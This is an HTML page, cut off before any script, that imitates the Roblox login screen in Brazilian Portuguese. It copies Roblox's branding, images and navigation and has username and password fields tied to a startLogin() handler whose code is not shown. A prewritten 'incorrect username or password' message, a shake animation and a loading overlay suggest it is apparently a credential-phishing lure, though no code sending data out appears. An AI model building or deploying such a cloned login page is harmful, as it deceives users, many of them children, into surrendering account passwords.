<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    <style>
        /* FONTES E CORES */
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');

        :root {
            --bg-main: #000000;
            --bg-header: #23252b;
            --bg-card: #2b2d32;
            --input-bg: #393b43;
            --rbx-blue: #0066ff;
            --text-main: #ffffff;
            --text-muted: #adb0bb;
            --border-input: #45474d;
            --rbx-error: #df281f;
        }

        /* BARRA DE ROLAGEM COM SETAS (image_8c2c3e.png) */
        ::-webkit-scrollbar {
            width: 14px;
        }

        ::-webkit-scrollbar-track {
            background: #2b2d32;
        }

        ::-webkit-scrollbar-thumb {
            background: #65666a;
            border: 3px solid #2b2d32;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #75767a;
        }

        /* Botões de seta da barra de rolagem */
        ::-webkit-scrollbar-button:single-button {
            background-color: #2b2d32;
            display: block;
            border-style: none;
            height: 14px;
            width: 14px;
        }

        /* Seta para cima */
        ::-webkit-scrollbar-button:single-button:vertical:decrement {
            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100' fill='%2365666a'><polygon points='50,20 20,80 80,80'/></svg>");
            background-size: 8px;
            background-repeat: no-repeat;
            background-position: center;
        }

        /* Seta para baixo */
        ::-webkit-scrollbar-button:single-button:vertical:increment {
            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100' fill='%2365666a'><polygon points='50,80 20,20 80,20'/></svg>");
            background-size: 8px;
            background-repeat: no-repeat;
            background-position: center;
        }

        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            font-family: 'HCo Gotham SSm', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
            overflow-x: hidden;
        }

        /* CABEÇALHO (image_8bb348.png) */
        .roblox-header {
            width: 100%;
            height: 40px;
            background: var(--bg-header);
            display: flex;
            align-items: center;
            padding: 0 12px;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
            box-sizing: border-box;
        }

        .header-left {
            display: flex;
            align-items: center;
        }

        .roblox-logo {
            height: 30px;
            width: 30px;
            margin-right: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .roblox-logo svg {
            width: 28px;
            height: 28px;
            fill: white;
        }

        .nav-links {
            display: flex;
            gap: 24px;
            font-size: 15px;
            font-weight: 500;
            margin-right: 20px;
        }

        .nav-links span {
            cursor: pointer;
            white-space: nowrap;
        }

        .nav-links span:hover {
            color: var(--text-muted);
        }

        /* BARRA DE PESQUISA (image_8bc704.png) */
        .search-container {
            position: relative;
            width: 280px;
            display: flex;
            align-items: center;
        }

        .search-container input {
            width: 100%;
            height: 28px;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid #45474d;
            border-radius: 4px;
            padding: 0 10px 0 35px;
            color: white;
            font-size: 14px;
            outline: none;
        }

        .search-container input::placeholder {
            color: #adb0bb;
            opacity: 0.8;
        }

        .search-container .search-icon {
            position: absolute;
            left: 10px;
            width: 17px;
            height: 17px;
            fill: #adb0bb;
            pointer-events: none;
        }

        .spacer {
            flex-grow: 1;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .btn-signup {
            background: var(--rbx-blue);
            color: white;
            border: none;
            padding: 4px 12px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
        }

        .btn-login-small {
            background: transparent;
            color: white;
            border: 1px solid white;
            padding: 3px 12px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
        }

        /* CONTEÚDO PRINCIPAL (image_8bca86.jpg) */
        .main-content {
            min-height: 100vh;
            background: linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.65)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 60px 0;
        }

        .login-card {
            background-color: var(--bg-card);
            width: 400px;
            padding: 40px 30px;
            border-radius: 4px;
            text-align: center;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            z-index: 5;
        }

        h1 {
            font-size: 28px;
            margin: 0 0 25px 0;
            font-weight: 700;
            color: white;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-field {
            width: 100%;
            height: 44px;
            background-color: var(--input-bg);
            border: 1px solid var(--border-input);
            border-radius: 4px;
            color: #fff;
            padding: 0 12px;
            box-sizing: border-box;
            outline: none;
            font-size: 15px;
        }

        .input-field:focus {
            border-color: #ffffff;
        }

        .btn-entrar {
            width: 100%;
            height: 38px;
            background: transparent;
            color: white;
            border: 1px solid white;
            border-radius: 4px;
            font-weight: 500;
            font-size: 16px;
            margin-top: 15px;
            cursor: pointer;
        }

        .forgot-link {
            display: block;
            margin: 20px 0;
            font-size: 14px;
            color: white;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .btn-secondary {
            width: 100%;
            height: 38px;
            background: #393b43;
            color: white;
            border: none;
            border-radius: 4px;
            margin-top: 12px;
            font-weight: 500;
            cursor: pointer;
            font-size: 14px;
        }

        .btn-secondary:hover {
            background: #45474d;
        }

        .footer-card {
            margin-top: 30px;
            font-size: 14px;
            color: white;
        }

        .footer-card a {
            color: white;
            text-decoration: none;
            font-weight: 700;
        }

        /* ERRO E OVERLAY */
        #error-box {
            color: var(--rbx-error);
            background: rgba(223,40,31,0.1);
            padding: 10px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 15px;
            display: none;
            text-align: left;
            border-left: 3px solid var(--rbx-error);
        }

        #overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.85);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 2000;
        }

        .spinner {
            width: 35px; height: 35px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .shake { animation: shake 0.2s ease-in-out 2; }
    </style>
</head>
<body>

    <div id="overlay"><div class="spinner"></div></div>

    <header class="roblox-header">
        <div class="header-left">
            <div class="roblox-logo">
                <svg viewBox="0 0 28 28">
                    <path d="M7.05 4L24 7.05 20.95 24 4 20.95 7.05 4zM11.5 16.5h5v-5h-5v5z"/>
                </svg>
            </div>
            <div class="nav-links">
                <span>Destaques</span>
                <span>Mercado</span>
                <span>Criar</span>
                <span>Robux</span>
            </div>
        </div>
        
        <div class="search-container">
            <svg class="search-icon" viewBox="0 0 16 16">
                <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
            </svg>
            <input type="text" placeholder="Pesquisar">
        </div>

        <div class="spacer"></div>

        <div class="header-right">
            <button class="btn-signup">Cadastrar-se</button>
            <button class="btn-login-small">Entrar</button>
        </div>
    </header>

    <main class="main-content">
        <div class="login-card" id="card">
            <h1>Entrar na Roblox</h1>
            
            <div id="error-box">Usuário ou senha incorretos.</div>

            <div class="input-group">
                <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" autocomplete="off" oninput="hideError()">
            </div>
            <div class="input-group">
                <input type="password" id="pass" class="input-field" placeholder="Senha" oninput="hideError()">
            </div>
            
            <button class="btn-entrar" onclick="startLogin()">Entrar</button>

            <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>

            <button class="btn-secondary">Envie-me um código único por e-mail</button>
            <button class="btn-secondary">Entrada rápida</button>

            <div class="footer-card">
                Não possui uma conta? <a href="#">Cadastrar-se</a>
            </div>
        </div>
    </main>
